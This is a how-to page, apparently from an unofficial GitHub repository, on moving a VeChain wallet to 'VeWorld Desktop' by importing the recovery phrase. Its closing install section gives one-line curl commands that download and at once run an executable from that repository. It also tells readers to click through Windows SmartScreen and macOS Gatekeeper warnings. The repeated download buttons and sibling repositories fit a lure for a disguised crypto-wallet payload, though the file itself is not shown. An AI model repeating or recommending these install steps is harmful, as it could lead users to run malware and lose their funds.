![VeWorld Desktop](../assets/banner-article.png)

# VeChain Thor Wallet to VeWorld Desktop: How the Move Works

Import the phrase; nothing is sent across the network

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

Moving from the earlier VeChain mobile wallet to VeWorld Desktop is an import, not a transfer. You enter the same recovery phrase in the new wallet, it derives the same 0x address, and the balances appear without anything being sent across the network. Nothing needs to be sold, swapped or withdrawn first.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

You still hold <a href="https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-vet-in-veworld-desktop.md">your VET</a> in the older VeChain mobile wallet and want it in a desktop application, or the old app will no longer let you complete an action you used to take for granted.

| Situation | What is true | What to do |
|---|---|---|
| The old app still opens | The address and phrase are still valid | Import the phrase into the desktop wallet |
| The old app will not open | The phrase still controls the address | Restore from the written phrase |
| Both apps show the same balance | Expected after an import; one address, two views | Keep one and stop using the other |
| The new wallet shows zero after import | A different derivation path was used | Retry with the alternate path option |

## Why it happens

An address on VeChainThor is derived from a phrase by a fixed mathematical process. Any wallet that implements the same derivation from the same phrase arrives at the same address, with the same tokens, on the same chain. The wallet is a viewer and a signer; the address belongs to the phrase, not to the application that first created it.

That is why migrating is cheap and instant. There is no bridge, no withdrawal queue and no fee for "moving" a balance between wallets, because nothing moves. The old app and the new one are two windows onto one account. Sending a token to yourself through the network would cost a fee and achieve exactly what the import already did.

The friction is in the details. The phrase must be entered in the right order, with the right word count, and with the same derivation path the original wallet used. Some wallets created accounts at a path that is not the default, and an import that assumes the default lands on a different address - valid, empty, and alarming. A custom path option exists for exactly this case.

The phrase is also the most valuable thing a person can hold, so <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md">what VeWorld Desktop can and cannot protect</a> is worth reading before it is typed anywhere. The import step is also where people who want the phrase concentrate their attention. The app's restore screen is the only place it belongs. No migration service, no support agent and no website needs it, and any request that claims otherwise is aimed at the balance rather than at helping.

## Fix

1. Retrieve the written recovery phrase for the old wallet. If none exists, check whether the old app can still display one before it is removed from the device.
2. Install the current release of VeWorld Desktop from the project's GitHub releases page.
3. Choose the import option and its recovery-phrase path rather than creating a new wallet.
4. Enter the words in order. If the address shown afterwards is not the one holding your funds, go back and set the custom derivation path.
5. Compare the first and last four characters of the derived address with the old wallet's address, then confirm the balances.
6. Once the balance is visible, stop using the old app for transactions so there is a single place where the keys are used.

What the import does not do is rebuild anything the old application added around the address. Contacts, labels and a local history belong to the software that stored them, so a migrated account opens with the balances and the token list but without the annotations. That is expected: the chain holds the account, while the app holds its own conveniences, and the convenience layer is the part that does not travel.

## If that did not work

If the address is wrong, try the alternate derivation path before concluding the phrase is incorrect. A phrase can be entirely valid and still produce several addresses depending on the path used.

If the phrase is rejected outright, check the word count: twelve and twenty-four are the usual lengths, and a word missing from the middle produces a phrase that fails validation. Read the written copy slowly rather than from memory.

If the balance is right but a token is missing, refresh the account. Token detection scans the address, and a newly opened account may show native balances before contract tokens.

## Prevention

- Keep the written phrase offline; a photograph of it in a synced camera roll is an exposure.
- Import first, verify the address, and only then consider the old app retired from your routine.
- Never send the phrase to anyone offering to help with a migration.
- Keep the desktop app on the current release, since import paths and detection improve between releases.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Do I need to send my VET to a new address?

No. Importing the phrase reproduces the same address, so the balance is already there. A transfer would cost a fee and change nothing.

### How do I use the VeChainThor wallet today?

The phrase it holds still controls the address, so the practical route is to import that phrase into a maintained wallet and work from there.

### What if I never wrote the phrase down?

Then the address can only be reached through an app that already has the keys. Write the phrase down as soon as the wallet can show it, before the device changes.

### Why did the import produce an empty address?

Almost always a derivation path difference. The custom path option exists for accounts created outside a wallet's default.

### Will both apps show the same balance afterwards?

Yes, because they read the same address. Only one of them should be used for signing, so the keys have a single home.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Leaving Sync and Sync2 behind](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md)
- [What VeWorld Desktop is and where it comes from](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)
- [When an imported wallet shows a zero balance](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [Why an old desktop wallet falls behind the chain](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-sync-in-veworld-desktop.md)